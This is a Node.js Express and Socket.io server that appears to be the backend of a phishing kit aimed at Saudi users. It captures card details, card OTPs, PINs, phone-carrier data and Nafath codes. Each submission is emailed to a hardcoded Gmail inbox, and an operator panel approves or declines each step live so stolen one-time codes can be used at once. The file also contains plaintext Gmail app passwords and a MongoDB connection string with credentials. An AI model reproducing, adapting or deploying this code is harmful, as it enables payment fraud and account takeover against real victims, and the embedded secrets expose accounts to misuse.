const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors());
app.use(require('morgan')('dev'))

const emailData = {
  user: "a38244486@gmail.com",
  pass: "zojn mhzk kasv capu",
  // user: "saudiabsher1990@gmail.com",
  // pass: "qlkg nfnn xaeq fitz",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Visa"
          : type === "otp"
          ? " Visa  Otp"
          : type === "pin"
          ? " Visa Pin "
          : type === "phone"
          ? "Provider Gate Data "
          : type === "phoneOtp"
          ? "Provider Gate Otp "
          : "DATA "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.sendStatus(200));
app.delete('/',async(req,res)=>{
    await Order.find({}).then(async (orders) => {
        await Promise.resolve(
          orders.forEach(async (order) => {
            await Order.findByIdAndDelete(order._id);
          })
        );
      }).then(()=>res.sendStatus(200))
})


app.post("/visa", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "visa").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    CardOtp: req.body.otp,
    checked: false,
    OtpCardAccept: false,
  }).then(
    async () => await sendEmail(req.body, "otp").then(() => res.sendStatus(200))
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    pin: req.body.pin,
    checked: false,
    PinAccept: false,
  }).then(
    async () => await sendEmail(req.body, "pin").then(() => res.sendStatus(200))
  );
});
app.post("/phone/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    phoneAccept: false,
  }).then(
    async () => await sendEmail(req.body, "phone").then(() => res.sendStatus(200))
  );
});

app.post("/phoneOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    phoneOtp: req.body.phoneOtp,
    checked: false,
    phoneOtpAccept: false,
  }).then(
    async () => await sendEmail(req.body, "phoneOtp").then(() => res.sendStatus(200))
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

io.on("connection", (socket) => {
  console.log("connected");


  socket.on("visa", (data) => io.emit("visa", data));

  socket.on("acceptVisa", async (id) => {
    console.log("acceptVisa From Admin", id);
    console.log(id);
    io.emit("acceptVisa", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });
  socket.on("declineVisa", async (id) => {
    console.log("declineVisa From Admin", id);
    io.emit("declineVisa", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("declineVisaOtp", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });
  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("acceptVisaPin", id);
  });
  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("declineVisaPin", id);
  });

  socket.on("phone", (data) => {
    console.log("phone Data", data);
    io.emit("phone", data);
  });

  socket.on("acceptPhone", async (id) => {
    console.log("Phone Data", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: true });
    io.emit("acceptPhone", id);
  });
  socket.on("declinePhone", async (id) => {
    console.log("declinePhone Data", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: true });
    io.emit("declinePhone", id);
  });



  socket.on("phoneOtp", async(data) => {
    console.log("phoneOtp received", data);
    await Order.findByIdAndUpdate(data.id, {
      phoneOtp: data.phoneOtp,
      STCAccept: false,
    });
    io.emit("phoneOtp", data);
  });
  socket.on("acceptPhoneOtp", async ({id,code}) => {
    console.log("acceptPhoneOtp send", id);
    io.emit("acceptPhoneOtp", {id,code});
  });
  socket.on("declinePhoneOtp", async (id) => {
    console.log("declinePhoneOtp send", id);
    io.emit("declinePhoneOtp", id);
    await Order.findByIdAndUpdate(id, { phoneOtpAccept: true });
  });

  socket.on("acceptSTC", async (id) => {
    console.log("acceptSTC send", id);
    io.emit("acceptSTC", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
  });
  socket.on("declineSTC", async (id) => {
    console.log("declineSTC send", id);
    io.emit("declineSTC", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
  });

  socket.on("navaz", (data) => {
    console.log("navaz received", data);
    io.emit("navaz", data);
  });
  socket.on("acceptNavaz", async (data) => {
    console.log("acceptNavaz send", data);
    io.emit("acceptNavaz", data);
    await Order.findByIdAndUpdate(data.id, {
      NavazAccept: true,
      NavazOtp: data.userOtp,
    });
  });
  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz send", id);
    io.emit("declineNavaz", id);
    await Order.findByIdAndUpdate(id, { NavazAccept: true });
  });
  socket.on("successValidate", (data) => io.emit("successValidate", data));
  socket.on("declineValidate", (data) => io.emit("declineValidate", data));
});


// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};


mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/tameni5555")
  .then((conn) =>
    server.listen(PORT, () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    })
  );
